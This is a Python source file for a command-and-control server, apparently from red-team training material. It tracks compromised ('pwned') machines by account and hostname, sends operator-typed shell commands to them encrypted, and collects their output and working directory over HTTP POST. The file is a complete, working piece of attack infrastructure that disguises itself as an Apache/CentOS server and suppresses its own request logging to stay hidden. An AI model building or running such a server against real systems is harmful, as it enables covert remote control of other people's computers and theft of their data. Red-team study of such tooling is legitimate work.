from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import unquote_plus
from inputimeout import inputimeout, TimeoutOccurred
from encryption import cipher
from settings import PORT, CMD_REQUEST, CWD_RESPONSE, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY, BIND_ADDR


def get_new_session():
    """ Function to check if other sessions exist.  If none do, re-initialize variables.  However, if sessions do
    exist, allow the red team operator to pick one to become a new active session. """

    # These variables must be global as they will often be updated via multiple sessions
    global active_session, pwned_dict, pwned_id

    # Remove the dictionary entry for the current active session
    del pwned_dict[active_session]

    # If the dictionary is empty, re-initialize variables to their starting values
    if not pwned_dict:
        print("Waiting for new connections.\n")
        pwned_id = 0
        active_session = 1
    else:
        # Display sessions in our dictionary and choose one of them to switch over to
        while True:
            print(*pwned_dict.items(), sep="\n")
            try:
                new_session = int(input("\nChoose a session number to make active: "))
            except ValueError:
                print("\nYou must choose a pwned id of one of the sessions shown on the screen\n")
                continue

            # Ensure we enter a pwned_id that is in our pwned_dict and set active_session to it
            if new_session in pwned_dict:
                active_session = new_session
                print(f"\nActive session is now: {pwned_dict[active_session]}")
                break
            else:
                print("\nYou must choose a pwned id of one of the sessions shown on the screen.\n")
                continue


class C2Handler(BaseHTTPRequestHandler):
    """ This is a child class of the BaseHTTPRequestHandler class.  It handles all HTTP requests that arrive at the c2
    server."""

    # Make our c2 server look like an up-to-date Apache server on CentOS
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"

    # noinspection PyPep8Naming
    def do_GET(self):
        """ This method handles all HTTP GET requests that arrive at the c2 server. """

        # These variables must be global as they will often be updated via multiple sessions
        global active_session, client_account, client_hostname, pwned_dict, pwned_id

        # Follow this code block when the compromised computer is requesting a command
        if self.path.startswith(CMD_REQUEST):

            # Split out the client from the HTTP GET request
            client = self.path.split(CMD_REQUEST)[1]

            # Encode the client data because decrypt requires it, then decrypt, then decode
            client = cipher.decrypt(client.encode()).decode()

            # Split out the client account name
            client_account = client.split('@')[0]

            # Split out the client hostname
            client_hostname = client.split('@')[1]

            # If the client is NOT in our pwned_dict dictionary:
            if client not in pwned_dict.values():

                # Sends the HTTP response code and header back to the client
                self.http_response(404)

                # Increment our pwned_id and add the client to pwned_dict using pwned_id as the key
                pwned_id += 1
                pwned_dict[pwned_id] = client

                # Print the good news to our screen
                print(f"{client_account}@{client_hostname} has been pwned!\n")

            # If the client is in pwned_dict, and it is also our active session:
            elif client == pwned_dict[active_session]:

                # If INPUT_TIMEOUT is set, run inputtimeout instead of regular input
                if INPUT_TIMEOUT:

                    # Azure kills a waiting HTTP GET session after 4 minutes, so we must handle input with a timeout
                    try:
                        # Collect the command to run on the client; set Linux style prompt as well
                        command = inputimeout(prompt=f"{client_account}@{client_hostname}:{cwd}$ ",
                                              timeout=INPUT_TIMEOUT)

                    # If a timeout occurs on our input, do a simple command to trigger a new connection
                    except TimeoutOccurred:
                        command = KEEP_ALIVE_CMD
                else:

                    # Collect the command to run on the client; set Linux style prompt as well
                    command = input(f"{client_account}@{client_hostname}:{cwd}$ ")

                # Write the command back to the client as a response; must utf-8 encode and encrypt
                try:
                    self.http_response(200)
                    self.wfile.write(cipher.encrypt(command.encode()))

                # If an exception occurs, notify us and get a new session to set active
                except BrokenPipeError:
                    print(f"Lost connection to {pwned_dict[active_session]}.\n")
                    get_new_session()

                # If we have just killed a client, try to get a new session to set active
                if command.startswith("client kill"):
                    get_new_session()

            # The client is in pwned_dict, but it is not our active session:
            else:

                # Sends the HTTP response code and header back to the client
                self.http_response(404)

    # noinspection PyPep8Naming
    def do_POST(self):
        """ This method handles all HTTP POST requests that arrive at the c2 server. """

        # Follow this code block when the compromised computer is responding with data to be printed on the screen
        if self.path == RESPONSE:
            print(self.handle_post_data())

        # Follow this code block when the compromised computer is responding with its current working directory
        elif self.path == CWD_RESPONSE:
            global cwd
            cwd = self.handle_post_data()

        # Nobody should ever be posting to our c2 server other than to the above paths
        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server.  Why?\n")

    def handle_post_data(self):
        """ Function to handle post data from a client. """

        # Sends the HTTP response code and header back to the client
        self.http_response(200)

        # Get Content-Length value from HTTP Headers
        content_length = int(self.headers.get("Content-Length"))

        # Gather the client's data by reading in the HTTP POST data
        client_data = self.rfile.read(content_length)

        # UTF-8 decode the client's data
        client_data = client_data.decode()

        # Remove the HTTP POST variable and the equal sign from the client's data
        client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)

        # HTML/URL decode the client's data and translate '+' to a space
        client_data = unquote_plus(client_data)

        # Encode the client data because decrypt requires it, then decrypt, then decode
        client_data = cipher.decrypt(client_data.encode()).decode()

        # Return the processed client's data
        return client_data

    def http_response(self, code: int):
        """ Function that sends the HTTP response code and headers back to the client. """
        self.send_response(code)
        self.end_headers()

    def log_request(self, code="-", size="-"):
        """ Included this to override BaseHTTPRequestHandler's log_request method because it writes to the
        screen.  Ours doesn't log any successful connections; it just returns, which is what we want. """
        return


# This maps to the client that we have a prompt for
active_session = 1

# This is the current working directory from the client belonging to the active session
cwd = "~"

# This is the account from the client belonging to the active session
client_account = ""

# This is the hostname from the client belonging to the active session
client_hostname = ""

# Used to uniquely count and track each client connecting in to the c2 server
pwned_id = 0

# Tracks all pwned clients; key = pwned_id and value is unique from each client (account@hostname@epoch time)
pwned_dict = {}

# Instantiate our HTTPServer object
# noinspection PyTypeChecker
server = HTTPServer((BIND_ADDR, PORT), C2Handler)

# Run the server in an infinite loop
server.serve_forever()
